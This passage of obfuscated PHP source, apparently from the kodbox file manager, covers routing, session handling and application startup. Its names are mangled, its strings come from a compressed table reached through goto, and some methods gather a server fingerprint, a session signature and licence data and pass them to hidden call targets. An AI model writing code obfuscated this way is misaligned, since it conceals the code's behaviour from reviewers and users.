(!$Ô¹˜Ü§…[$­ËÂæéí]) { return !1; } return ActionCall($_SERVER[«òÑğ][1702], $Ô¹˜Ü§…[$­ËÂæéí]); } public function url($ë¦‚ÙÛÇ, $Èœ“³Ãï = '', $á¾¡Ì²Ê = true) { $ÒÌ¢£²À =& $_SERVER[«òÑğ]; $ŞßûÀ³Õ = $this->getConfig(); $¶öõØ„± = KOD_VERSION . $ÒÌ¢£²À[10] . KOD_VERSION_BUILD; $Ó˜¡„½î = $this->packageVersion(); $İ˜û‚Ë = $¶öõØ„± . $ÒÌ¢£²À[465] . $Ó˜¡„½î; if (substr($ë¦‚ÙÛÇ, 0, 4) == $ÒÌ¢£²À[152] || substr($ë¦‚ÙÛÇ, 0, 2) == $ÒÌ¢£²À[1421]) { $´ùËÂ° = $ë¦‚ÙÛÇ . $ÒÌ¢£²À[1703] . $İ˜û‚Ë; } else { if ($Èœ“³Ãï == $ÒÌ¢£²À[12]) { $´ùËÂ° = $this->pluginHost . $ë¦‚ÙÛÇ . $ÒÌ¢£²À[1703] . $İ˜û‚Ë; } else { if ($Èœ“³Ãï === $ÒÌ¢£²À[78]) { $´ùËÂ° = $this->pluginHost . $ë¦‚ÙÛÇ; } else { if ($Èœ“³Ãï == $ÒÌ¢£²À[1704]) { $´ùËÂ° = STATIC_PATH . $ë¦‚ÙÛÇ . $ÒÌ¢£²À[1703] . $¶öõØ„±; } else { if ($Èœ“³Ãï == $ÒÌ¢£²À[1705]) { $´ùËÂ° = APP_HOST . $ÒÌ¢£²À[1706] . $ë¦‚ÙÛÇ . $ÒÌ¢£²À[1703] . $¶öõØ„±; } else { if (isset($ŞßûÀ³Õ[$Èœ“³Ãï])) { $´ùËÂ° = $ŞßûÀ³Õ[$Èœ“³Ãï] . $ë¦‚ÙÛÇ . $ÒÌ¢£²À[1703] . $İ˜û‚Ë; } } } } } } if (!$á¾¡Ì²Ê) { return $´ùËÂ°; } echo $´ùËÂ°; } public function link($¸šÅ×¼Ë = false, $Ï£¦ äí = '') { $ÑõŠºµğ =& $_SERVER[«òÑğ]; $ñ¥ÃßÙ‹ = $this->linkHas == !1; $this->linkHas = !0; if (!$¸šÅ×¼Ë) { $this->link($ÑõŠºµğ[1707], $ÑõŠºµğ[1705]); $this->link($ÑõŠºµğ[1708], $ÑõŠºµğ[1704]); $this->link($ÑõŠºµğ[1709], $ÑõŠºµğ[1704]); $this->link($ÑõŠºµğ[1710], $ÑõŠºµğ[1704]); $this->link($ÑõŠºµğ[1711], $ÑõŠºµğ[1704]); if ($ñ¥ÃßÙ‹) { Hook::trigger($ÑõŠºµğ[1712]); } return; } $·³¡ñ = $this->url($¸šÅ×¼Ë, $Ï£¦ äí, !1); if (substr($¸šÅ×¼Ë, -3) == $ÑõŠºµğ[1713]) { echo $ÑõŠºµğ[1714] . $·³¡ñ . $ÑõŠºµğ[1715] . $ÑõŠºµğ[288]; } else { if (substr($¸šÅ×¼Ë, -4) == $ÑõŠºµğ[1716]) { echo $ÑõŠºµğ[1717] . $·³¡ñ . $ÑõŠºµğ[1718] . $ÑõŠºµğ[288]; } } if ($ñ¥ÃßÙ‹) { Hook::trigger($ÑõŠºµğ[1712]); } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\156\171" => "\x5b\x5e\x2f\135\x2b", "\x3a\156\165\x6d" => "\133\60\55\71\x5d\53", "\x3a\x61\154\x6c" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($Ôª´ÏÌ, $ıïÑíŸÕ) { $í¦íØ´ˆ =& $_SERVER[«òÑğ]; if ($Ôª´ÏÌ == $í¦íØ´ˆ[1719]) { $¾³ÜçƒŠ = array_map($í¦íØ´ˆ[1720], $ıïÑíŸÕ[0]); $ºÈªÇ¿ = strpos($ıïÑíŸÕ[1], $í¦íØ´ˆ[8]) === 0 ? $ıïÑíŸÕ[1] : $í¦íØ´ˆ[8] . $ıïÑíŸÕ[1]; $äÙ³Ó»µ = $ıïÑíŸÕ[2]; } else { $¾³ÜçƒŠ = null; $ºÈªÇ¿ = strpos($ıïÑíŸÕ[0], $í¦íØ´ˆ[8]) === 0 ? $ıïÑíŸÕ[0] : $í¦íØ´ˆ[8] . $ıïÑíŸÕ[0]; $äÙ³Ó»µ = $ıïÑíŸÕ[1]; } array_push(self::$maps, $¾³ÜçƒŠ); array_push(self::$routes, $ºÈªÇ¿); array_push(self::$methods, strtoupper($Ôª´ÏÌ)); array_push(self::$callbacks, $äÙ³Ó»µ); } public static function error($äÚ¼—Æã) { self::$errorCallback = $äÚ¼—Æã; } public static function haltOnMatch($¬˜ÙıÜ¥ = true) { self::$halts = $¬˜ÙıÜ¥; } public static function dispatch() { $ŒÚµŒâ =& $_SERVER[«òÑğ]; $Âó¶ó÷ü = parse_url($_SERVER[$ŒÚµŒâ[1721]], PHP_URL_PATH); $İ‡ƒï¥Š = $_SERVER[$ŒÚµŒâ[164]]; $„”¯‘ê– = array_keys(static::$patterns); $£”ÔÎ°Â = array_values(static::$patterns); $ãèÎ­Ì = !1; self::$routes = preg_replace($ŒÚµŒâ[1371], $ŒÚµŒâ[8], self::$routes); if (in_array($Âó¶ó÷ü, self::$routes)) { $İû¦ñÀ = array_keys(self::$routes, $Âó¶ó÷ü); foreach ($İû¦ñÀ as $”™†â‚¾) { if (self::$methods[$”™†â‚¾] == $İ‡ƒï¥Š || self::$methods[$”™†â‚¾] == $ŒÚµŒâ[1722] || in_array($İ‡ƒï¥Š, self::$maps[$”™†â‚¾])) { $ãèÎ­Ì = !0; if (!is_object(self::$callbacks[$”™†â‚¾])) { $„…îšç· = explode($ŒÚµŒâ[8], self::$callbacks[$”™†â‚¾]); $ôù¶¨¡ = end($„…îšç·); $©®»ò–ì = explode($ŒÚµŒâ[1303], $ôù¶¨¡); $ñ¹®¨®‘ = new $©®»ò–ì[0](); $ñ¹®¨®‘->{$©®»ò–ì[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$”™†â‚¾]); if (self::$halts) { return; } } } } } else { $´’®Ø“ = 0; foreach (self::$routes as $”™†â‚¾) { if (strpos($”™†â‚¾, $ŒÚµŒâ[4]) !== !1) { $”™†â‚¾ = str_replace($„”¯‘ê–, $£”ÔÎ°Â, $”™†â‚¾); } if (preg_match($ŒÚµŒâ[1723] . $”™†â‚¾ . $ŒÚµŒâ[1724], $Âó¶ó÷ü, $„ã©ÛÊÙ)) { if (self::$methods[$´’®Ø“] == $İ‡ƒï¥Š || self::$methods[$´’®Ø“] == $ŒÚµŒâ[1722] || !empty(self::$maps[$´’®Ø“]) && in_array($İ‡ƒï¥Š, self::$maps[$´’®Ø“])) { $ãèÎ­Ì = !0; array_shift($„ã©ÛÊÙ); if (!is_object(self::$callbacks[$´’®Ø“])) { $„…îšç· = explode($ŒÚµŒâ[8], self::$callbacks[$´’®Ø“]); $ôù¶¨¡ = end($„…îšç·); $©®»ò–ì = explode($ŒÚµŒâ[1303], $ôù¶¨¡); $ñ¹®¨®‘ = new $©®»ò–ì[0](); if (!method_exists($ñ¹®¨®‘, $©®»ò–ì[1])) { echo $ŒÚµŒâ[1725]; } else { call_user_func_array(array($ñ¹®¨®‘, $©®»ò–ì[1]), $„ã©ÛÊÙ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$´’®Ø“], $„ã©ÛÊÙ); if (self::$halts) { return; } } } } $´’®Ø“++; } } if ($ãèÎ­Ì == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $ÜŒ¡î„ =& $_SERVER[«òÑğ]; header($_SERVER[$ÜŒ¡î„[1726]] . $ÜŒ¡î„[1727]); echo $ÜŒ¡î„[1728]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$ŒÚµŒâ[1721]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $é«ØÍ¬­ =& $_SERVER[«òÑğ]; static $û•ß™¦½ = false; if ($û•ß™¦½) { return $û•ß™¦½; } $ëŞ«×©è = $GLOBALS[$é«ØÍ¬­[6]][$é«ØÍ¬­[427]]; self::$sessionTime = $ëŞ«×©è[$é«ØÍ¬­[1729]]; $šâı¬Ò = isset($GLOBALS[$é«ØÍ¬­[1730]]) ? $GLOBALS[$é«ØÍ¬­[1730]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($šâı¬Ò)) { self::$sessionSign = Cookie::get($šâı¬Ò); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($šâı¬Ò, self::$sessionSign, self::$sessionTime); $İß¾ÛÊ = $ëŞ«×©è[$é«ØÍ¬­[1731]]; $Ş©ÌÂ¶¯ = $ëŞ«×©è[$İß¾ÛÊ]; $ÃğÈñè = $ëŞ«×©è[$é«ØÍ¬­[917]]; switch ($İß¾ÛÊ) { case $é«ØÍ¬­[21]: self::$handle = Model($é«ØÍ¬­[918]); break; case $é«ØÍ¬­[919]: self::$handle = new CacheRedis($Ş©ÌÂ¶¯, $ÃğÈñè); break; case $é«ØÍ¬­[920]: self::$handle = new CacheMemcached($Ş©ÌÂ¶¯, $ÃğÈñè); break; case $é«ØÍ¬­[233]: $Ş©ÌÂ¶¯[$é«ØÍ¬­[87]] = $Ş©ÌÂ¶¯[$é«ØÍ¬­[87]] . $é«ØÍ¬­[1732]; self::$handle = new CacheFile($Ş©ÌÂ¶¯, $ÃğÈñè); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $û•ß™¦½ = new self(); return $û•ß™¦½; } public static function getBySign($´Å´â°¹) { $†€æ¤¦ø = self::$handle->get($´Å´â°¹); $†€æ¤¦ø = unserialize($†€æ¤¦ø); return is_array($†€æ¤¦ø) ? $†€æ¤¦ø : array(); } public static function setBySign($Å«ŒØĞË, $Öå¥‹Ğ) { CacheLock::lock($Å«ŒØĞË); self::$handle->set($Å«ŒØĞË, serialize($Öå¥‹Ğ), self::$sessionTime); CacheLock::unlock($Å«ŒØĞË); } public static function sign($³ÒØ«†¹ = false) { if ($³ÒØ«†¹) { self::$sessionSign = $³ÒØ«†¹; } self::init(); return self::$sessionSign; } public static function set($ áİİ’™, $åÚÆÍæğ = false) { self::init(); if (is_array($ áİİ’™)) { foreach ($ áİİ’™ as $éªœ¯íê => $ÌšÆ¬±•) { array_set_value(self::$data, $éªœ¯íê, $ÌšÆ¬±•); } } else { array_set_value(self::$data, $ áİİ’™, $åÚÆÍæğ); } self::setBySign(self::$sessionSign, self::$data); } public static function get($ë”ÁÅºŒ = false) { self::init(); if (!$ë”ÁÅºŒ) { return self::$data; } return array_get_value(self::$data, $ë”ÁÅºŒ); } public static function remove($Ó­Õî Û) { self::init(); unset(self::$data[$Ó­Õî Û]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[«òÑğ][923])) { self::$handle->clearTimeout(); } } } goto fñƒ‚ºÜÒ½; cİ¶í„ˆçÕ: $_SERVER[óÙù™Ê÷] = explode($_SERVER[«òÑğ][688], gzinflate(substr($_SERVER[«òÑğ][689], 10, -8))); $gnjmbafiyl = $_SERVER[«òÑğ][690]; class Application { private $defaultModule = "\x69\156\x64\x65\x78"; private $defaultController = "\x69\x6e\x64\x65\x78"; private $defaultAction = "\x69\x6e\144\x65\x78"; function __construct() { } public function setDefault($ËìšÓ§Ø) { $‡¶âª“ =& $_SERVER[«òÑğ]; $Œ”‰†œ» =& $_SERVER[óÙù™Ê÷]; $å‡­   = explode($Œ”‰†œ»[0], trim($ËìšÓ§Ø, $Œ”‰†œ»[0])); $this->defaultModule = $å‡­  [0] ? $å‡­  [0] : $this->defaultModule; $this->defaultController = $å‡­  [1] ? $å‡­  [1] : $this->defaultController; $íñàÒÇó = $‡¶âª“[691]; if (!$íñàÒÇó) { return; } $this->defaultAction = $å‡­  [2] ? $å‡­  [2] : $this->defaultAction; $Ö£´›­ = $‡¶âª“[692]; if (strlen($Ö£´›­) < $‡¶âª“[693]) { return; } $this->bjol916b0064($Œ”‰†œ»[1], array($this, $Œ”‰†œ»[2])); $ÎïûôÃÔ = $‡¶âª“[694]; } public function appRun($ÂË›èáİ) { $şµ‚±ïå =& $_SERVER[«òÑğ]; $šÂ–—¿’ =& $_SERVER[óÙù™Ê÷]; $ÌÁêîæÇ = explode($šÂ–—¿’[0], $ÂË›èáİ); $‹¿ıûùÎ = $şµ‚±ïå[695]; while ($‹¿ıûùÎ < $şµ‚±ïå[696]) { if ($‹¿ıûùÎ >= 0) { break; } $‹¿ıûùÎ++; } $ÑÄ¾Ô¯ = strtolower($ÌÁêîæÇ[0]); $¤ë¿Ì„ = $şµ‚±ïå[697]; while (strlen($¤ë¿Ì„) < $şµ‚±ïå[696]) { if (!$¤ë¿Ì„) { break; } $¤ë¿Ì„++; } $¤ñœÓË = $šÂ–—¿’[3]; $í™Şç = $şµ‚±ïå[698]; if (!$í™Şç) { die; } if ($ÑÄ¾Ô¯ == $šÂ–—¿’[4]) { $¤ñœÓË = $šÂ–—¿’[5]; $ÌÁêîæÇ[0] = $šÂ–—¿’[6]; $ÌÁêîæÇ[1] = $ÌÁêîæÇ[1] . $šÂ–—¿’[7]; $ÂË›èáİ = join($šÂ–—¿’[0], $ÌÁêîæÇ); $ÂË›èáİ = trim($ÂË›èáİ, $šÂ–—¿’[0]); } call_user_func(array($šÂ–—¿’[8], $šÂ–—¿’[9]), $¤ñœÓË . $šÂ–—¿’[10], $ÂË›èáİ); ActionCall($ÂË›èáİ); call_user_func(array($šÂ–—¿’[8], $šÂ–—¿’[9]), $¤ñœÓË . $šÂ–—¿’[11], $ÂË›èáİ); $¶ÀË·˜² = $şµ‚±ïå[699]; } private function autorun() { $Ê°®¸Òö =& $_SERVER[óÙù™Ê÷]; global $config; if (count($config[$Ê°®¸Òö[12]]) == 0) { return; } foreach ($config[$Ê°®¸Òö[12]] as $×ÏÆ€åÙ => $á™”Ëóñ) { $this->appRun($á™”Ëóñ); $ÓĞç®Ê½ = $_SERVER[«òÑğ][700]; if (!$ÓĞç®Ê½) { die; } } } private function nlwaa112ca26() { $´¨ŞÑì­ =& $_SERVER[«òÑğ]; $ı´øé• =& $_SERVER[óÙù™Ê÷]; $üö©®Ÿ = $ı´øé•[4]; $ä—À‚ŸÂ = $´¨ŞÑì­[701]; if (strlen($ä—À‚ŸÂ) < $´¨ŞÑì­[702]) { return; } $”àş²†ı = $GLOBALS[$ı´øé•[13]][$ı´øé•[14]][0]; if (!$”àş²†ı || strlen($”àş²†ı) <= strlen($üö©®Ÿ)) { return; } if (strtolower(substr($”àş²†ı, -strlen($üö©®Ÿ))) != $üö©®Ÿ) { return; } $Òëâü€ = substr($”àş²†ı, 0, -strlen($üö©®Ÿ)); $¢¾Ü—ûä = array($ı´øé•[4], $Òëâü€); $ÙÊÉëóŞ = array_slice($GLOBALS[$ı´øé•[13]][$ı´øé•[14]], 1); $§˜×Ò‚• = $´¨ŞÑì­[703]; $GLOBALS[$ı´øé•[13]][$ı´øé•[14]] = array_merge($¢¾Ü—ûä, $ÙÊÉëóŞ); $GLOBALS[$ı´øé•[13]][$ı´øé•[15]] = implode($ı´øé•[0], $GLOBALS[$ı´øé•[13]][$ı´øé•[14]]); $Ê¼‡™Ò = $´¨ŞÑì­[704]; if (!$Ê¼‡™Ò) { return; } } private function zpcg1b6027e5() { $ŸÎßÒ¨£ =& $_SERVER[«òÑğ]; $‚ˆ™øœ“ =& $_SERVER[óÙù™Ê÷]; if ($GLOBALS[$‚ˆ™øœ“[13]][$‚ˆ™øœ“[15]] != $‚ˆ™øœ“[6]) { return; } $ñö»Õ…À = $_SERVER[$‚ˆ™øœ“[16]]; $¨€ŠÔßÈ = $‚ˆ™øœ“[17]; if (!strstr($ñö»Õ…À, $¨€ŠÔßÈ)) { return; } $°€İşÑ¡ = strrpos($ñö»Õ…À, $¨€ŠÔßÈ); $Òüİ‚°ó = substr($ñö»Õ…À, $°€İşÑ¡ + strlen($¨€ŠÔßÈ)); $€»³…ÕÂ = $ŸÎßÒ¨£[705]; if (strlen($€»³…ÕÂ) < $ŸÎßÒ¨£[706]) { return; } preg_match_all($‚ˆ™øœ“[18], $Òüİ‚°ó, $üé‘µÍ¸); $Òüİ‚°ó = trim($üé‘µÍ¸[0][0], $‚ˆ™øœ“[19]); $GLOBALS[$‚ˆ™øœ“[13]][$‚ˆ™øœ“[14]] = explode($‚ˆ™øœ“[19], $Òüİ‚°ó); $GLOBALS[$‚ˆ™øœ“[13]][$‚ˆ™øœ“[15]] = implode($‚ˆ™øœ“[0], $GLOBALS[$‚ˆ™øœ“[13]][$‚ˆ™øœ“[14]]); $¡³óÖİÇ = $ŸÎßÒ¨£[707]; if (strlen($¡³óÖİÇ) < $ŸÎßÒ¨£[693]) { die; } } public function run() { $ÀĞîêÆ =& $_SERVER[«òÑğ]; $êÍá–¡² =& $_SERVER[óÙù™Ê÷]; $this->zpcg1b6027e5(); $this->nlwaa112ca26(); $•Ñ…ı¡ = $ÀĞîêÆ[708]; if (!$•Ñ…ı¡) { die; } $ˆğ¦Ê«Ù = $GLOBALS[$êÍá–¡²[13]][$êÍá–¡²[14]]; $ä¯§«ÌÀ = $GLOBALS[$êÍá–¡²[13]][$êÍá–¡²[15]]; define($êÍá–¡²[20], isset($ˆğ¦Ê«Ù[0]) && $ˆğ¦Ê«Ù[0] ? $ˆğ¦Ê«Ù[0] : $this->defaultModule); $‰íé’şÛ = $ÀĞîêÆ[709]; if (!$‰íé’şÛ) { die; } define($êÍá–¡²[21], isset($ˆğ¦Ê«Ù[1]) && $ˆğ¦Ê«Ù[0] ? $ˆğ¦Ê«Ù[1] : $this->defaultController); $‘£­„™æ = $ÀĞîêÆ[710]; define($êÍá–¡²[22], isset($ˆğ¦Ê«Ù[2]) && $ˆğ¦Ê«Ù[0] ? $ˆğ¦Ê«Ù[2] : $this->defaultAction); define($êÍá–¡²[23], MOD . $êÍá–¡²[0] . ST . $êÍá–¡²[0] . ACT); $_SERVER[$êÍá–¡²[24]] = strtolower(ACTION); $ÕÓØÄÎ¼ = $ÀĞîêÆ[711]; if (!$ÕÓØÄÎ¼) { die; } $this->autorun(); if (count($ˆğ¦Ê«Ù) >= 3) { $this->appRun($ä¯§«ÌÀ); } else { $this->appRun(ACTION); } } private $jixp729c9007 = array(); private $akme593d53e6 = ''; public function rfez4489ded1() { $Ö¼²”Ô =& $_SERVER[«òÑğ]; $ ¹Ş‹ªñ =& $_SERVER[óÙù™Ê÷]; $this->efmrc58e7e20(); $ŸìÎŸÊ = $Ö¼²”Ô[712]; if (!$ŸìÎŸÊ) { die; } $this->ljek9279bab0(); $this->inubeba72164(); $şĞªçäö = $Ö¼²”Ô[713]; while ($şĞªçäö < $Ö¼²”Ô[693]) { if ($şĞªçäö >= 0) { break; } $şĞªçäö++; } $this->mxqkbabd792f(); $this->zvcs64f5cf08(); $this->okwsd43e10d9(); $ÁÎ¯îåû = $Ö¼²”Ô[714]; if (strlen($ÁÎ¯îåû) < $Ö¼²”Ô[702]) { die; } $this->griv4db22967(); $‹²ºØï = $Ö¼²”Ô[715]; $this->bjol916b0064($ ¹Ş‹ªñ[25], array($this, $ ¹Ş‹ªñ[26])); $this->bjol916b0064($ ¹Ş‹ªñ[27], array($this, $ ¹Ş‹ªñ[28])); $½ºŒİéÃ = $Ö¼²”Ô[716]; if (!$½ºŒİéÃ) { die; } $this->bjol916b0064($ ¹Ş‹ªñ[29], array($this, $ ¹Ş‹ªñ[30])); $ˆ÷º–ÕÒ = $Ö¼²”Ô[717]; if (strlen($ˆ÷º–ÕÒ) < $Ö¼²”Ô[693]) { die; } $this->bjol916b0064($ ¹Ş‹ªñ[31], array($this, $ ¹Ş‹ªñ[32])); $¦î¬Ô×æ = $Ö¼²”Ô[718]; if (!$¦î¬Ô×æ) { return; } } public function uila1ebc385a($¯ğ‘”º) { $Š—õÑ¿Ù =& $_SERVER[«òÑğ]; $ö…—¡ü =& $_SERVER[óÙù™Ê÷]; $¥ó®Âá = Model($ö…—¡ü[33])->get(); $Å¦´í = array($ö…—¡ü[34], $ö…—¡ü[35], $ö…—¡ü[36], $ö…—¡ü[37], $ö…—¡ü[38], $ö…—¡ü[39], $ö…—¡ü[40], $ö…—¡ü[41], $ö…—¡ü[42], $ö…—¡ü[43], $ö…—¡ü[44], $ö…—¡ü[45], $ö…—¡ü[46], $ö…—¡ü[47], $ö…—¡ü[48], $ö…—¡ü[49], $ö…—¡ü[50], $ö…—¡ü[51], $ö…—¡ü[52], $ö…—¡ü[53], $ö…—¡ü[54], $ö…—¡ü[55], $ö…—¡ü[56], $ö…—¡ü[57], $ö…—¡ü[58], $ö…—¡ü[59], $ö…—¡ü[60], $ö…—¡ü[61], $ö…—¡ü[62], $ö…—¡ü[63], $ö…—¡ü[64], $ö…—¡ü[65], $ö…—¡ü[66], $ö…—¡ü[67], $ö…—¡ü[68], $ö…—¡ü[69], $ö…—¡ü[70], $ö…—¡ü[71], $ö…—¡ü[72], $ö…—¡ü[73], $ö…—¡ü[74], $ö…—¡ü[75], $ö…—¡ü[76], $ö…—¡ü[77], $ö…—¡ü[78], $ö…—¡ü[79], $ö…—¡ü[80], $ö…—¡ü[81], $ö…—¡ü[82], $ö…—¡ü[83], $ö…—¡ü[84], $ö…—¡ü[85]); foreach ($Å¦´í as $Ç£¸ÒºÔ) { $ôÒ±ÃÓŠ = $GLOBALS[$ö…—¡ü[86]][$ö…—¡ü[87]][$Ç£¸ÒºÔ]; if (isset($¥ó®Âá[$Ç£¸ÒºÔ])) { $ôÒ±ÃÓŠ = $¥ó®Âá[$Ç£¸ÒºÔ]; } $¯ğ‘”º[$ö…—¡ü[88]][$ö…—¡ü[89]][$Ç£¸ÒºÔ] = $ôÒ±ÃÓŠ; } $ñœÂÊì = $¯ğ‘”º[$ö…—¡ü[88]][$ö…—¡ü[89]][$ö…—¡ü[46]]; $”ÜĞéÈ = $Š—õÑ¿Ù[719]; unset($¯ğ‘”º[$ö…—¡ü[88]][$ö…—¡ü[90]][$ö…—¡ü[91]]); $Ã«‰¥£Æ = $Š—õÑ¿Ù[720]; if (!$Ã«‰¥£Æ) { die; } unset($¯ğ‘”º[$ö…—¡ü[88]][$ö…—¡ü[90]][$ö…—¡ü[92]]); unset($¯ğ‘”º[$ö…—¡ü[88]][$ö…—¡ü[89]][$ö…—¡ü[46]]); $å¤ìÅª = $Š—õÑ¿Ù[721]; if (!$å¤ìÅª) { die; } unset($¯ğ‘”º[$ö…—¡ü[88]][$ö…—¡ü[89]][$ö…—¡ü[93]]); $õÈŒ‚«î = $Š—õÑ¿Ù[722]; $¯ğ‘”º[$ö…—¡ü[88]][$ö…—¡ü[89]][$ö…—¡ü[94]] = array($ö…—¡ü[95] => (int) $ñœÂÊì[$ö…—¡ü[96]], $ö…—¡ü[97] => (int) _get($ñœÂÊì, $ö…—¡ü[98], 0)); $•»€•û¤ = $Š—õÑ¿Ù[723]; if (strlen($•»€•û¤) < $Š—õÑ¿Ù[724]) { die; } $ºááÈ¢Ô = substr(md5($ö…—¡ü[99] . get_client_ip() . $¥ó®Âá[$ö…—¡ü[100]]), 0, 15); $¯ğ‘”º[$ö…—¡ü[101]][$ö…—¡ü[102]] = Mcrypt::encode(Session::sign(), $ºááÈ¢Ô, 3600 * 24); $¯ğ‘”º[$ö…—¡ü[101]][$ö…—¡ü[103]] = Action($ö…—¡ü[104])->accessToken(); $¯ğ‘”º[$ö…—¡ü[101]][$ö…—¡ü[105]] = md5($_SERVER[$ö…—¡ü[106]] . $¥ó®Âá[$ö…—¡ü[100]]); $¯ğ‘”º[$ö…—¡ü[101]][$ö…—¡ü[107]] = base64_encode(serverInfo()); $ô´¤ºÜå = $Š—õÑ¿Ù[725]; if (strlen($ô´¤ºÜå) < $Š—õÑ¿Ù[724]) { return; } $¯ğ‘”º[$ö…—¡ü[101]][$ö…—¡ü[108]] = $this->akme593d53e6; if ($¥ó®Âá[$ö…—¡ü[108]] != $ö…—¡ü[109]) { $¯ğ‘”º[$ö…—¡ü[101]][$ö…—¡ü[110]] = $¥ó®Âá[$ö…—¡ü[110]]; $¯ğ‘”º[$ö…—¡ü[101]][$ö…—¡ü[111]] = $¥ó®Âá[$ö…—¡ü[111]]; $ÄÂ½¤Âæ = rand_string(10) . $this->akme593d53e6 . rand_string(5); $¯ğ‘”º[$ö…—¡ü[88]][$ö…—¡ü[112]][$ö…—¡ü[113]] = $this->hqezba28bfdf($ÄÂ½¤Âæ, $¯ğ‘”º[$ö…—¡ü[101]][$ö…—¡ü[105]]); } if ($this->akme593d53e6 == $ö…—¡ü[109]) { $¯ğ‘”º[$ö…—¡ü[88]][$ö…—¡ü[89]][$ö…—¡ü[94]][$ö…—¡ü[98]] = 0; } $¯ğ‘”º[$ö…—¡ü[101]][$ö…—¡ü[114]] = $this->versionPluginFilter(); $¯ğ‘”º[$ö…—¡ü[101]][$ö…—¡ü[115]] = _get($this->jixp729c9007, $ö…—¡ü[116], $ö…—¡ü[6]); $ÃôÇÊ¯ = $Š—õÑ¿Ù[726]; if (KodUser::isRoot() && $this->config[$ö…—¡ü[117]]) { $¯ğ‘”º[$ö…—¡ü[101]][$ö…—¡ü[118]] = WEB_ROOT; } return $¯ğ‘”º; } private function okwsd43e10d9() { $ä°æÆã =& $_SERVER[«òÑğ]; $ÖÛ„ÉÄù =& $_SERVER[óÙù™Ê÷]; $§í¹ÈÙ« = $_SERVER[$ÖÛ„ÉÄù[24]] == $ÖÛ„ÉÄù[119]; if ($_SERVER[$ÖÛ„ÉÄù[24]] == $ÖÛ„ÉÄù[120] && $_GET[$ÖÛ„ÉÄù[121]] == $ÖÛ„ÉÄù[122]) { $§í¹ÈÙ« = !0; } if ($§í¹ÈÙ«) { $õ²ÇÃ²ù = array($ÖÛ„ÉÄù[108] => $this->akme593d53e6, $ÖÛ„ÉÄù[123] => $this->nxyj9e6a672d(), $ÖÛ„ÉÄù[124] => Model($ÖÛ„ÉÄù[125])->count()); if ($this->akme593d53e6 != $ÖÛ„ÉÄù[109]) { $“Œèà‚Ì = _get($this->jixp729c9007, $ÖÛ„ÉÄù[126]); if ($“Œèà‚Ì) { $õ²ÇÃ²ù[$ÖÛ„ÉÄù[127]] = $“Œèà‚Ì; $õ²ÇÃ²ù[$ÖÛ„ÉÄù[128]] = strtotime(_get($this->jixp729c9007, $ÖÛ„ÉÄù[129])); $õ²ÇÃ²ù[$ÖÛ„ÉÄù[130]] = _get($this->jixp729c9007, $ÖÛ„ÉÄù[116]); } $²òŸ¼­ê = Model($ÖÛ„ÉÄù[33])->get($ÖÛ„ÉÄù[131], $ÖÛ„ÉÄù[6], !0); if (is_string($²òŸ¼­ê) && substr($²òŸ¼­ê, 0, 1) == $ÖÛ„ÉÄù[132]) { $²òŸ¼­ê = json_decode_force($²òŸ¼­ê); } if (is_array($²òŸ¼­ê) && $²òŸ¼­ê[$ÖÛ„ÉÄù[133]] && strstr($²òŸ¼­ê[$ÖÛ„ÉÄù[133]], $ÖÛ„ÉÄù[134])) { $ƒà÷èŞÅ = explode($ÖÛ„ÉÄù[134], $²òŸ¼­ê[$ÖÛ„ÉÄù[133]]); $õ²ÇÃ²ù[$ÖÛ„ÉÄù[135]] = $ƒà÷èŞÅ[0]; } } $õ²ÇÃ²ù = $this->fypma159390a(json_encode($õ²ÇÃ²ù), md5($ÖÛ„ÉÄù[136])); $Á·ë¤Àè = $ä°æÆã[727]; $ §’×ÊÔ = array($ÖÛ„ÉÄù[137] => $õ²ÇÃ²ù); $üıì•¯š = $ä°æÆã[728]; while ($üıì•¯š < $ä°æÆã[706]) { if ($üıì•¯š >= 0) { break; } $üıì•¯š++; } call_user_func(array($ÖÛ„ÉÄù[138], $ÖÛ„ÉÄù[139]), $ §’×ÊÔ); $»éœçñÏ = $ä°æÆã[729]; } if ($this->akme593d53e6 == $ÖÛ„ÉÄù[109]) { return; } $¨™‘‰÷ = array($ÖÛ„ÉÄù[140], $ÖÛ„ÉÄù[141], $ÖÛ„ÉÄù[142], $ÖÛ„ÉÄù[143], $ÖÛ„ÉÄù[144], $ÖÛ„ÉÄù[145]); $¾ĞØ™æ÷ = Model($ÖÛ„ÉÄù[33])->get(); $ §’×ÊÔ = array($ÖÛ„ÉÄù[146] => $¾ĞØ™æ÷[$ÖÛ„ÉÄù[34]], $ÖÛ„ÉÄù[147] => $¾ĞØ™æ÷[$ÖÛ„ÉÄù[35]], $ÖÛ„ÉÄù[148] => $ÖÛ„ÉÄù[6]); foreach ($¨™‘‰÷ as $ş¨ı£»¤) { if (!isset($¾ĞØ™æ÷[$ş¨ı£»¤]) || !$¾ĞØ™æ÷[$ş¨ı£»¤]) { continue; } $ §’×ÊÔ[$ş¨ı£»¤] = $¾ĞØ™æ÷[$ş¨ı£»¤]; } call_user_func(array($ÖÛ„ÉÄù[138], $ÖÛ„ÉÄù[139]), $ §’×ÊÔ); $´…àÆäË = $ä°æÆã[730]; if (strlen($´…àÆäË) < $ä°æÆã[724]) { die; } } private function mxqkbabd792f() { $ù¼¨× =& $_SERVER[«òÑğ]; $ÖŸÂ”“Œ =& $_SERVER[óÙù™Ê÷]; if ($_SERVER[$ÖŸÂ”“Œ[24]] != $ÖŸÂ”“Œ[149]) { return; } if (!KodUser::isRoot()) { die; } $ûÓ®•¥¦ = $GLOBALS[$ÖŸÂ”“Œ[13]]; if (isset($ûÓ®•¥¦[$ÖŸÂ”“Œ[150]])) { 